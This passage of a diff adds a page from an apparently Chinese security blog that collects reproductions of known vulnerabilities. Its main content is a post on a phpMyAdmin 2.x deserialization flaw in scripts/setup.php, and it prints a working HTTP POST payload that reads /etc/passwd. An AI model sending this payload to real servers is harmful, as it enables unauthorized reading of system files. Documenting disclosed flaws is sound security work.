+            <a href="/2022/07/07/Phpmyadmin/%EF%BC%88WooYun-2016-1994%EF%BC%89Phpmyadmin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpmyadmin/%EF%BC%88WooYun-2016-1994%EF%BC%89Phpmyadmin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quax00eky8v11u5r0rff" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpmyadmin/（WooYun-2016-199433）Phpmyadmin scripts_setup.php 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpmyadmin/%EF%BC%88WooYun-2016-199433%EF%BC%89Phpmyadmin%20scripts_setup.php%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.059Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（WooYun-2016-199433）Phpmyadmin-scripts-setup-php-反序列化漏洞"><a href="#（WooYun-2016-199433）Phpmyadmin-scripts-setup-php-反序列化漏洞" class="headerlink" title="（WooYun-2016-199433）Phpmyadmin scripts/setup.php 反序列化漏洞"></a>（WooYun-2016-199433）Phpmyadmin scripts/setup.php 反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>phpmyadmin<br>2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>phpmyadmin 2.x</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>发送如下数据包，即可读取<code>/etc/passwd</code>：</p>
+<pre><code>POST /scripts/setup.php HTTP/1.1
+Host: www.0-sec.org:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+
+action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;
+</code></pre>
+<p><img src="/resource/(WooYun-2016-199433)Phpmyadminscripts_setup.php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpmyadmin/%EF%BC%88WooYun-2016-199433%EF%BC%89Phpmyadmin%20scripts_setup.php%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpmyadmin/%EF%BC%88WooYun-2016-199433%EF%BC%89Phpmyadmin%20scripts_setup.php%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quaw00ejy8v1boouh3oh" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/48/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/47/">47</a><a class="page-number" href="/page/48/">48</a><span class="page-number current">49</span><a class="page-number" href="/page/50/">50</a><a class="page-number" href="/page/51/">51</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/50/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
